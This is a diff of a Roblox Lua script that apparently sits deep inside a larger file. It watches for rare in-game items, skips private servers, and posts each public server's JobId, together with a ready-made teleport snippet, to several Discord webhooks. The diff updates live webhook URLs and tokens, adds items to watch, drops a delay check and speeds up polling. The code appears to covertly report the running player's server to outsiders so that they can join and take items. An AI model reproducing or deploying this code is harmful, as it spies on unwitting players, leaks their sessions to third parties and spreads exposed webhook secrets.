@@ -2284,11 +2284,11 @@ local allowedPlaceId = 109983668079237
 if game.PlaceId ~= allowedPlaceId then return end
 
 local webhookUrls = {
-    "https://discord.com/api/webhooks/1398580759442231307/YEYvSzOrWKPo_uw-xSSwgIqfl1zXK47fLf93NOTB1Jtsux3bnTWjRR0OWygEwZD4yDSl",
-    "https://discord.com/api/webhooks/1398075572604633188/PB21kIJHSLj6Pd-_P6hxhgunzMbl4dhc_XoNPqSE2gxdzjgbfQmUnR7ctOR3OwZVu2qG"
+    "https://discord.com/api/webhooks/1397993708124770416/C0W7wrzwpWQltujrupJ0qOUfnX9sf3_5NVd3EgbctdLSHTisXm_-juUKt7QN5zAWYA2b",
+    "https://discord.com/api/webhooks/1398580759442231307/YEYvSzOrWKPo_uw-xSSwgIqfl1zXK47fLf93NOTB1Jtsux3bnTWjRR0OWygEwZD4yDSl"
 }
 
-local extraWebhookUrl = "https://discord.com/api/webhooks/1397993708124770416/C0W7wrzwpWQltujrupJ0qOUfnX9sf3_5NVd3EgbctdLSHTisXm_-juUKt7QN5zAWYA2b"
+local extraWebhookUrl = "https://discord.com/api/webhooks/1396804813471350874/RHDbjxnu6lvkgahhNXZWKuoYU6lZOff6BcvOud5hhSnw_hUXX1h_EP00jmnt3n8bhQKp"
 local midWebhookUrl   = "https://discord.com/api/webhooks/1398075572604633188/PB21kIJHSLj6Pd-_P6hxhgunzMbl4dhc_XoNPqSE2gxdzjgbfQmUnR7ctOR3OwZVu2qG"
 
 local brainrotGods = {
@@ -2326,10 +2326,13 @@ local brainrotRanks = {
 }
 
 local specialForThirdWebhook = {
-    ["Garama and Madundung"]     = true,
+    ["Garama And Madundung"]     = true,
     ["Nuclearo Dinossauro"]      = true,
     ["La Grande Combinasion"]    = true,
     ["Chicleteira Bicicleteira"] = true,
+    ["Secret Lucky Block"] = true,
+    ["Pot Hotspot"] = true,
+    ["Graipuss Medussi"] = true,
 }
 
 local colorGold     = Color3.fromRGB(237, 178, 0)
@@ -2340,16 +2343,9 @@ local COLOR_EPSILON = 0.02
 local notified        = {}
 local lastSentMessage = ""
 
--- Track player join times for the 30-second check
 local playerJoinTimes = {}
-
-Players.PlayerAdded:Connect(function(player)
-    playerJoinTimes[player.UserId] = tick()
-end)
-
-Players.PlayerRemoving:Connect(function(player)
-    playerJoinTimes[player.UserId] = nil
-end)
+Players.PlayerAdded:Connect(function(player) playerJoinTimes[player.UserId] = tick() end)
+Players.PlayerRemoving:Connect(function(player) playerJoinTimes[player.UserId] = nil end)
 
 local function colorsAreClose(c1, c2)
     return math.abs(c1.R - c2.R) < COLOR_EPSILON and
@@ -2402,34 +2398,20 @@ local function getPlayerCount()
 end
 
 local function sendNotification(modelName, mutation, moneyText)
-    -- Stronger Private Server Detection
     if game.PrivateServerId ~= "" then return end
     if game.PrivateServerOwnerId and game.PrivateServerOwnerId ~= 0 then return end
     if game.VIPServerOwnerId and game.VIPServerOwnerId ~= 0 then return end
-
-    local jobId = game.JobId
-    if not jobId or jobId == "" then return end
-
-    local lowerJobId = jobId:lower()
-    if lowerJobId:find("priv") or lowerJobId:find("reserved") or lowerJobId:find("vip") then return end
-
     if #Players:GetPlayers() == 1 then
         local success, result = pcall(function()
             return game:GetService("TeleportService"):GetPlayerPlaceInstanceAsync(Players:GetPlayers()[1].UserId)
         end)
-        if not success or not result or result.InstanceId ~= jobId then
-            return
-        end
+        if not success or not result or result.InstanceId ~= game.JobId then return end
     end
-
     local playerCount = getPlayerCount()
     if playerCount < 5 or playerCount > 7 then return end
 
     local placeId = tostring(game.PlaceId)
-    if not placeId or placeId == "" then return end
-    if not jobId   or jobId   == "" then return end
-    if not modelName or modelName == "" then return end
-    if not mutation  or mutation  == "" then return end
+    if not placeId or not game.JobId or not modelName or not mutation then return end
 
     local gameName = "Unknown"
     pcall(function()
@@ -2439,7 +2421,7 @@ local function sendNotification(modelName, mutation, moneyText)
 
     local msg = string.format([[
 
----- <@&1392894797831733329> ----
+---- Secret Is Found ✅ ----
 
 --- 📢 Game: %s
 
@@ -2447,14 +2429,14 @@ local function sendNotification(modelName, mutation, moneyText)
 
 --- 🎨 Mutation: %s
 
---- 💵 Money/s: %s
+--- 💸 Money/s: %s
 
 --- 👥 Player Count: %d/8
 
 local player = game.Players:GetPlayers()[1]
 local teleportService = game:GetService("TeleportService")
 teleportService:TeleportToPlaceInstance("%s", "%s", player)
-]], gameName, modelName, mutation, moneyText or "N/A", playerCount, placeId, jobId)
+]], gameName, modelName, mutation, moneyText or "N/A", playerCount, placeId, game.JobId)
 
     if msg:find("@everyone") or msg:find("@here") then return end
     if msg == lastSentMessage then return end
@@ -2468,16 +2450,12 @@ teleportService:TeleportToPlaceInstance("%s", "%s", player)
 
     for _, url in ipairs(webhookUrls) do
         pcall(function()
-            req({
-                Url     = url,
-                Method  = "POST",
-                Headers = headers,
-                Body    = jsonData
-            })
+            req({ Url = url, Method = "POST", Headers = headers, Body = jsonData })
         end)
     end
 
     if specialForThirdWebhook[modelName] then
+        --  midWebhookUrl still requires 30 seconds
         local enoughTimePassed = false
         for _, player in ipairs(Players:GetPlayers()) do
             local joinTime = playerJoinTimes[player.UserId]
@@ -2486,33 +2464,21 @@ teleportService:TeleportToPlaceInstance("%s", "%s", player)
                 break
             end
         end
-
         if enoughTimePassed then
             pcall(function()
-                req({
-                    Url     = midWebhookUrl,
-                    Method  = "POST",
-                    Headers = headers,
-                    Body    = jsonData
-                })
-            end)
-
-            pcall(function()
-                req({
-                    Url     = extraWebhookUrl,
-                    Method  = "POST",
-                    Headers = headers,
-                    Body    = jsonData
-                })
+                req({ Url = midWebhookUrl, Method = "POST", Headers = headers, Body = jsonData })
             end)
         end
+
+        --  extraWebhookUrl now always sends (30s check removed)
+        pcall(function()
+            req({ Url = extraWebhookUrl, Method = "POST", Headers = headers, Body = jsonData })
+        end)
     end
 end
 
 local function checkBrainrots()
-    local players = Players:GetPlayers()
-    if #players < 5 or #players > 7 then return end
-
+    if #Players:GetPlayers() < 5 or #Players:GetPlayers() > 7 then return end
     for _, model in ipairs(Workspace:GetChildren()) do
         if model:IsA("Model") and brainrotGods[model.Name] then
             local root = getPrimaryPart(model)
@@ -2521,7 +2487,6 @@ local function checkBrainrots()
                 if not notified[id] then
                     local color = root.Color
                     local mutation = "🕳️"
-
                     if colorsAreClose(color, colorGold) then
                         mutation = "🌕 Gold"
                     elseif colorsAreClose(color, colorDiamond) then
@@ -2531,7 +2496,6 @@ local function checkBrainrots()
                     elseif isRainbowMutating(model) then
                         mutation = "🌈 Rainbow"
                     end
-
                     local money = findNearbyMoneyText(root.Position + Vector3.new(0, 2, 0), 6) or "N/A"
                     sendNotification(model.Name, mutation, money)
                     notified[id] = true
@@ -2544,7 +2508,7 @@ end
 task.spawn(function()
     while true do
         pcall(checkBrainrots)
-        task.wait(0.5)
+        task.wait(0.1)
     end
 end)
 
